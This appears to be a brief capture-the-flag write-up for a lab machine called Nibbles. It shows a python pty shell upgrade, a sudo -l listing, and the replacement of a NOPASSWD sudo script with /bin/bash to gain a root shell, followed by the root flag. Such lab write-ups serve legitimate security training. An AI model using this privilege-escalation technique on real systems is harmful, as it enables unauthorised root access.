after updating our shell 
python3 -c 'import pty;pty.spawn("/bin/bash")'

running sudo -l 
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

by making the path /home/nibbler/personal/stuff/monitor.sh 
and just making a monitor.sh file with /bin/bash inside and making it executable we can just run it as sudo and we get a root bash shell 
#rootflag f52c0db4d521092fb04e40d24eea8ebd